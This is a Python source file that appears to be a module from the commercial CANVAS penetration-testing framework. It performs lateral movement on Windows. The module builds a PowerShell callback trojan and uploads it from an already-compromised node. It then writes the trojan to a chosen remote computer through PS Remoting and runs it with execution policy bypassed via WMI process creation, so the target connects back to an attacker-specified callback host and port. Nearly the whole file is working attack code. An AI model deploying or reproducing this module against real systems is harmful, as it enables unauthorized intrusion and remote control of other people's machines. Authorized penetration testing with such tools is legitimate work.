#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2015
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")

import os, getopt, string
import socket
import locale, random
from tempfile import NamedTemporaryFile
from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand
import logging
import canvasengine

NAME                            = "ad_dlexecute_psmosdef"
DESCRIPTION                     = "Use a PowerShell node to download and execute psmosdef to a different sytem using PS Remoting"
VERSION                         = "1.0"

DOCUMENTATION                   = {}

DOCUMENTATION["Commandline"]    = "runmodule ad_dlexecute_psmosdef -O callbackhost:HOST -O callbackport:PORT -O Computer: COMPUTER"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Commands"
PROPERTY['SITE']                = "Local"
PROPERTY['ARCH']                = [ ["Windows"] ]

DOCUMENTATION["Notes"]          = """

The target system must have PS Remoting enabled.

Execute a Powershell MOSDEF trojan in a remote computer specific by the Computer textfield.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result         = ""
        self.Computer       = ""
        self.url            = ""
        self.server         = None
        self.callback_host  = None
        self.callback_port  = 5555
        self.webserverport  = 8011

        return

    def getargs(self):
        self.Computer      = self.argsDict.get("Computer", self.Computer)
        self.getarg("callback_host")
        self.getarg("callback_port")

    def getPowerhShellCallback(self):
        app  = self.engine.getModuleExploit("BuildPowershellCallback")
        app.link(self)
        app.argsDict["callback_host"] = self.callback_host
        app.argsDict["callback_port"] = self.callback_port
        app.run()
        return app.filename


    # XXX: This will eventually be moved to the powershell ShellServer
    def uploadPowerShellScript(self, scriptName, shell):
        #Check if file exists
        try:
            fp = file(scriptName,"r")
            data = fp.read()
            fp.close()
        except IOError, i:
            e = "Error reading local file: %s" % str(i)
            self.setInfo("%s - done (failed: %s)" % (NAME,str(i)))
            logging.error(e)
            return 0
        #Check file encoding - we need to send only UTF-8
        try:
            udata = file_utf8_encoding(data)
        except Exception, i:
            e = "Error reading file data: %s" % str(i)
            self.setInfo("%s - done (failed: %s)" % (NAME,str(i)))
            logging.error(e)
            return 0

        destFile = strip_leading_path(''.join( random.choice(string.uppercase) for _ in range(6) ) + ".ps1" )
        logging.info("Uploading script: %s" % destFile)
        result = shell.upload(udata, destfilename = destFile, sourceisbuffer = True)
        logging.info("Upload Result: %s" % self.result )
        return destFile

    def run(self):
        self.getargs()
        self.setInfo("%s (in progress)" % (NAME))
        ret = False
        # runpowershellscript need a file to upload, it doesn't receive a buffer yet. So we have to comply with a tmp file
        for node in self.argsDict["passednodes"]:
            ntype = node.nodetype
            shell = node.shell
            if ntype == "PowerShellNode" or ntype in ['win32Node', 'win64Node']:
                uploadCallbackName = self.getPowerhShellCallback()
                destFile = self.uploadPowerShellScript(uploadCallbackName, shell)
                p = shell.getcwd()
                tfile  = self.getpowershellfile( p + "\\" + destFile )
                runpow = canvasengine.getModuleExploit("runpowershellscript")
                runpow.link(self)
                runpow.argsDict["filename"]   = tfile.name
                runpow.argsDict["copytodisk"] = False
                ret = runpow.run()

                users = []
                for a in runpow.result.replace("\r\n", "").split("***"):
                    a = string.strip(a)
                    if a:
                        users += [ a.split("@##@") ]
                self.result = users
                self.setInfo("%s - done (success)" % NAME)
                tfile.close()
                os.remove(str(tfile.name))
                return True
        else:
            logging.info("Node (%s) not supported" % ntype)
            self.setInfo("%s - done (failed)" % NAME)

        return ret

    def getpowershellfile(self, destFile):
        powershellfile = """
        try {
        $computer = 'HELLOCOMPUTER'
        $file = 'HELLONAME'
        $content = Get-Content -Path $file
        #$ErrorActionPreference = "SilentlyContinue"
        $CheckCommand = 'get-wmiobject -query "Select IPAddress From win32_NetworkAdapterConfiguration Where IPEnabled = True" -ComputerName HELLOCOMPUTER'
        $cmdtoexe = 'powershell.exe -ExecutionPolicy Bypass -noLogo c:\\windows\\temp\\HELLOFILE'
        $check = Invoke-Expression $CheckCommand
        if($check -ne $null){
             $bleh +=  ("{0} @##@ {1} @##@ {2} ***" -f $('admin success'), $('can connect to'), $($computer) )
             Invoke-Command -scriptblock {
                 Param($Content,$path)
                 $content | out-file -FilePath $path -Encoding ascii
                 } -ArgumentList @($content,"c:\\windows\\temp\\HELLOFILE") -ComputerName $computer
             $process = [WMICLASS]"\\\\$computer\\ROOT\\CIMv2:win32_process"
             $result = $process.Create($cmdtoexe)
        }
        else{
              $bleh +=  ("{0} @##@ {1} @##@ {2} ***" -f $('ERROR'), $('cannot connect to'), $($computer) )

        }
        $bleh | Out-String
        $result
        }
        Catch{
        "***" | Out-String
        }
        """

        powershellfile = powershellfile.replace("HELLOCOMPUTER", self.Computer)
        powershellfile = powershellfile.replace("HELLONAME", destFile)
        remoteFileName = ''.join( random.choice(string.uppercase) for _ in range(6) ) + ".ps1"
        powershellfile = powershellfile.replace("HELLOFILE", remoteFileName)
        tfile = NamedTemporaryFile("w+b", suffix=".ps1", bufsize=0,delete=False)
        tfile.write(powershellfile)
        return tfile